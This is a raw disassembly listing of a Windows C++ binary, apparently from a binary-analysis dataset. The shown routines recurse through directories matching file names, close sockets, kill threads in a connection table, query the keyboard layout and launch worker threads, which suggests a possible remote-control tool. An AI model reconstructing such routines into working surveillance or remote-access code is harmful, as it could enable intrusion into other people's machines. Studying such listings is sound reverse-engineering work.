call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x2d4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push ebx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
call sub_402504
add esp 0x14
mov ebx eax
inc ebx
neg ebx
sbb ebx ebx
inc ebx
mov [ ebp - 0x2a0 ] bl
lea ecx [ ebp - 0x2d4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x2c4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x2b4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
test bl bl
je r-xdata
push [ tolower@IAT ]
lea ecx [ ebp + 0x18 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::begin@IAT ]
push eax
lea ecx [ ebp + 0x18 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::end@IAT ]
push eax
lea ecx [ ebp + 0x18 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::begin@IAT ]
push eax
call sub_403646
add esp 0x10
lea eax [ ebp - 0x274 ]
push eax
push r--data
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x2e8 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call [ FindFirstFileW@IAT ]
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x2e8 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
cmp [ ebp - 0x14 ] 0xffffffff
jne r-xdata
mov [ ebp - 0x2d8 ] 0x1
push r--data
lea eax [ ebp - 0x2d8 ]
push eax
call _CxxThrowException
lea eax [ ebp - 0x274 ]
push eax
push [ ebp - 0x14 ]
call [ FindNextFileW@IAT ]
test eax eax
je r-xdata
push [ edi ]
sub esp 0x10
mov ecx esp
lea eax [ ebp - 0x2f0 ]
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_402504
add esp 0x14
mov [ ebp - 0x2f4 ] 0x2
push r--data
lea eax [ ebp - 0x2f4 ]
push eax
call _CxxThrowException
or [ ebp - 0x4 ] 0xffffffff
push [ ebp - 0x14 ]
call [ FindClose@IAT ]
push [ edi ]
sub esp 0x10
mov edi esp
lea eax [ ebp + 0x38 ]
push eax
push esi
lea eax [ ebp + 0x28 ]
push eax
push esi
push r--data
lea eax [ ebp - 0x39c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x3ac ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x3bc ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push edi
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
call sub_402504
add esp 0x14
lea ecx [ ebp - 0x3bc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x3ac ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x39c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
push eax
call sub_403474
pop ecx
pop ecx
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp + 0x18 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp + 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x38 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x40
test [ ebp - 0x274 ] 0x10
je r-xdata
lea eax [ ebp - 0x328 ]
push eax
lea eax [ ebp - 0x248 ]
push eax
lea ecx [ ebp - 0x284 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push [ tolower@IAT ]
lea ecx [ ebp - 0x284 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::begin@IAT ]
push eax
lea ecx [ ebp - 0x284 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::end@IAT ]
push eax
lea ecx [ ebp - 0x284 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::begin@IAT ]
push eax
call sub_403646
add esp 0x10
push 0x0
lea eax [ ebp + 0x18 ]
push eax
lea ecx [ ebp - 0x284 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::find@IAT ]
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
cmp eax [ ecx ]
je r-xdata
push r--data
lea eax [ ebp - 0x248 ]
push eax
mov ebx [ wcscmp@IAT ]
call ebx
pop ecx
pop ecx
test eax eax
je r-xdata
lea ecx [ ebp - 0x284 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
jmp r-xdata
lea eax [ ebp - 0x33c ]
push eax
push 0x250
lea eax [ ebp - 0x274 ]
push eax
lea ecx [ ebp - 0x338 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x338 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push [ edi ]
sub esp 0x10
mov ebx esp
lea eax [ ebp - 0x24 ]
push eax
push esi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x354 ]
push eax
call sub_40edd3
pop ecx
pop ecx
push eax
push esi
push r--data
lea eax [ ebp - 0x364 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x374 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x384 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push ebx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
call sub_402504
add esp 0x14
mov ebx eax
inc ebx
neg ebx
sbb ebx ebx
inc ebx
mov [ ebp - 0x340 ] bl
lea ecx [ ebp - 0x384 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x374 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x364 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x354 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
test bl bl
je r-xdata
push r--data
lea eax [ ebp - 0x248 ]
push eax
call ebx
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ ebp - 0x388 ] 0x4
push r--data
lea eax [ ebp - 0x388 ]
push eax
call _CxxThrowException
push r--data
lea eax [ ebp - 0x308 ]
push eax
lea eax [ ebp - 0x248 ]
push eax
lea ecx [ ebp - 0x304 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x318 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x294 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
lea ecx [ ebp - 0x318 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x304 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
sub esp 0x10
mov ecx esp
lea eax [ ebp + 0x18 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
sub esp 0x10
mov ecx esp
lea eax [ ebp - 0x294 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov ecx edi
call sub_403183
test al al
jne r-xdata
lea ecx [ ebp - 0x294 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov [ ebp - 0x324 ] 0x3
push r--data
lea eax [ ebp - 0x324 ]
push eax
call _CxxThrowException
sub_403183
push ebp
mov ebp esp
sub esp 0x2fc
push ebx
push esi
push edi
mov edi ecx
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x2c ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push [ tolower@IAT ]
lea ecx [ ebp + 0x18 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::begin@IAT ]
push eax
lea ecx [ ebp + 0x18 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::end@IAT ]
push eax
lea ecx [ ebp + 0x18 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::begin@IAT ]
push eax
call sub_403646
add esp 0x10
lea eax [ ebp - 0x2fc ]
push eax
lea eax [ ebp + 0x8 ]
push r--data
push eax
lea eax [ ebp - 0x3c ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call [ FindFirstFileW@IAT ]
lea ecx [ ebp - 0x3c ]
mov [ ebp - 0x8 ] eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
lea ecx [ ebp - 0x2c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp + 0x18 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov al 0x1
lea eax [ ebp - 0x2fc ]
push eax
push [ ebp - 0x8 ]
call [ FindNextFileW@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x8 ]
call [ FindClose@IAT ]
mov esi rw-data
lea eax [ ebp - 0xa ]
lea ecx [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x2d0 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push [ tolower@IAT ]
lea ecx [ ebp - 0x1c ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::begin@IAT ]
push eax
lea ecx [ ebp - 0x1c ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::end@IAT ]
push eax
lea ecx [ ebp - 0x1c ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::begin@IAT ]
push eax
call sub_403646
add esp 0x10
lea eax [ ebp + 0x18 ]
lea ecx [ ebp - 0x1c ]
push 0x0
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::find@IAT ]
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
cmp eax [ ecx ]
je r-xdata
mov ebx [ wcscmp@IAT ]
lea eax [ ebp - 0x2d0 ]
push r--data
push eax
call ebx
pop ecx
test eax eax
pop ecx
je r-xdata
lea ecx [ ebp - 0x1c ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea eax [ ebp - 0x2fc ]
push eax
push [ ebp - 0x8 ]
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x9 ]
lea ecx [ ebp - 0xac ]
push eax
lea eax [ ebp - 0x2fc ]
push 0x250
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea ecx [ ebp - 0x2c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0xac ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push [ edi ]
lea eax [ ebp - 0x2c ]
sub esp 0x10
mov ebx esp
push eax
lea eax [ ebp + 0x8 ]
push esi
push eax
lea eax [ ebp - 0x9c ]
push eax
call sub_40edd3
pop ecx
pop ecx
push eax
push esi
lea eax [ ebp - 0x7c ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x5c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x8c ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push ebx
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
call sub_402504
add esp 0x14
cmp eax 0xffffffff
lea ecx [ ebp - 0x8c ]
sete bl
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x5c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x7c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x9c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
test bl bl
jne r-xdata
lea eax [ ebp - 0x2d0 ]
push r--data
push eax
call ebx
pop ecx
test eax eax
pop ecx
je r-xdata
test [ ebp - 0x2fc ] 0x10
je r-xdata
lea ecx [ ebp - 0x1c ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x2c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp + 0x18 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
xor al al
jmp r-xdata
lea eax [ ebp - 0x1 ]
push 0x5c
push eax
lea eax [ ebp - 0x2d0 ]
push eax
lea ecx [ ebp - 0x6c ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x3c ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@G@Z
add esp 0xc
lea ecx [ ebp - 0x4c ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x6c ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
sub esp 0x10
lea eax [ ebp + 0x18 ]
mov ecx esp
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
sub esp 0x10
lea eax [ ebp - 0x3c ]
mov ecx esp
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov ecx edi
call sub_403183
lea ecx [ ebp - 0x3c ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
pop edi
pop esi
pop ebx
leave
retn 0x20
sub_403474
mov eax sub_40ffb8
call _EH_prolog
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
and [ ebp - 0x4 ] 0x0
xor edi edi
mov [ ebp - 0x14 ] edi
mov esi rw-data
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push edi
mov ecx esi
call sub_40356c
mov eax [ eax ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
inc edi
mov [ ebp - 0x14 ] edi
jmp r-xdata
push edi
mov ecx esi
call sub_40356c
mov eax [ eax + 0x8 ]
push [ eax ]
call closesocket
push 0x0
push edi
mov ecx esi
call sub_40356c
push [ eax + 0x4 ]
call [ TerminateThread@IAT ]
mov ecx esi
call sub_408633
lea ecx [ edi + edi * 2 ]
lea eax [ eax + ecx * 4 ]
push eax
mov ecx esi
call sub_403599
mov ecx esi
call sub_403556
cmp edi eax
jae r-xdata
sub_403522
push esi
mov esi ecx
push edi
push [ esi + 0x8 ]
push [ esi + 0x4 ]
call sub_4035d1
mov ecx [ esi + 0x4 ]
mov eax [ esi + 0xc ]
sub eax ecx
push 0xc
cdq
pop edi
idiv edi
push eax
push ecx
mov ecx esi
call sub_403626
xor eax eax
pop edi
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
pop esi
retn
sub_40356c
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
call sub_403556
mov esi [ ebp + 0x8 ]
cmp eax esi
ja r-xdata
mov ecx edi
call sub_408633
lea ecx [ esi + esi * 2 ]
pop edi
pop esi
lea eax [ eax + ecx * 4 ]
pop ebp
retn 0x4
mov ecx edi
call sub_4035f3
sub_403599
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
push edi
call sub_408637
push eax
lea eax [ edi + 0xc ]
push eax
call sub_40366e
mov eax [ esi + 0x8 ]
add esp 0xc
mov ecx esi
push eax
add eax 0xfffffff4
push eax
call sub_4035d1
add [ esi + 0x8 ] 0xfffffff4
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
sub_4035d1
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
pop edi
pop esi
pop ebp
retn 0x8
push esi
mov ecx edi
call sub_403636
add esi 0xc
jmp r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
sub_4035f3
push ebp
mov ebp esp
sub esp 0x30
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x14 ]
push eax
push r--data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x30 ]
push eax
call [ std::out_of_range::out_of_range@IAT ]
lea eax [ ebp - 0x30 ]
push r--data
push eax
call _CxxThrowException
sub_403646
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
pop esi
pop ebp
retn
movzx eax [ esi ]
push eax
call [ ebp + 0x14 ]
pop ecx
inc esi
mov ecx [ ebp + 0x10 ]
inc esi
add [ ebp + 0x10 ] 0x2
mov [ ecx ] ax
jmp r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
sub_40366e
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp + 0x10 ]
pop ebp
retn
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi eax
movsd [ edi ] [ esi ]
add [ ebp + 0x10 ] 0xc
add eax 0xc
cmp eax [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jne r-xdata
pop edi
pop esi
sub_4036c1
push esi
mov esi ecx
lea ecx [ esi + 0x70 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ esi + 0x60 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ esi + 0x50 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ esi + 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ esi + 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop esi
retn
sub_4036f3
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ esi + 0x4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ esi + 0x14 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ esi + 0x50 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ esi + 0x60 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ esi + 0x70 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
xor eax eax
mov [ esi ] eax
mov [ esi + 0x38 ] al
mov [ esi + 0x39 ] al
mov eax esi
pop esi
leave
retn
sub_40374a
push esi
mov esi ecx
push 0x0
call [ GetKeyboardLayout@IAT ]
push 0x9
and eax 0x3ff
pop ecx
cmp ax cx
je r-xdata
mov [ esi + 0x34 ] ecx
pop esi
retn
push 0x10
pop edx
cmp ax dx
jne r-xdata
mov [ esi + 0x34 ] edx
pop esi
retn
sub_403774
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
lea eax [ ebp + 0x8 ]
push edi
push eax
lea ecx [ esi + 0x50 ]
mov [ esi + 0x38 ] 0x1
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
mov ecx esi
call sub_40374a
mov ebx [ CreateThread@IAT ]
xor edi edi
push edi
push edi
push esi
push sub_40382c
push edi
push edi
call ebx
cmp [ esi ] edi
jne r-xdata
push edi
push edi
push esi
push sub_40383b
push edi
push edi
call ebx
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
push edi
push edi
push esi
push sub_40380c
push edi
push edi
call ebx
sub_4037d4
push ebp
mov ebp esp
push esi
mov esi ecx
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ esi + 0x50 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
xor eax eax
cmp [ esi + 0x38 ] al
jne r-xdata
lea ecx [ ebp + 0x8 ]
